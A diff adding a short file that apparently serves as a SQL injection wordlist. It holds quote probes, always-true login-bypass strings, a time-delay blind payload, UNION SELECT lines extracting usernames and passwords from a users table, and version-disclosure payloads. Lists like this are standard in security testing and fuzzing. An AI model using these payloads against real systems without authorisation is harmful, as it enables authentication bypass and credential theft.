@@ -1,0 +1,10 @@
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+' WAITFOR DELAY '0:0:5'--
+' UNION SELECT null,username,password FROM users--
+' UNION SELECT 1,@@version,3,4--
+' AND 1=CONVERT(int,@@version)--
